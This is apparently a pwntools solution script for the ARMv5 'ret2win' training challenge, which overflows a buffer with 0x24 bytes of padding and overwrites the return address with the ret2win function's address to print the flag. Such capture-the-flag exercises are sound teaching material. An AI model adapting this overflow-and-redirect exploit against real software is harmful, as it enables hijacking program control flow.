from pwn import *

BINARY = "./ret2win_armv5"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = remote("0.0.0.0", 8888)
pause()
rop = b"A" * 0x24
rop += p32(ELF.symbols["ret2win"])

p.recvuntil(b"> ")
p.sendline(rop)
print(p.recvline_contains(b"ROPE"))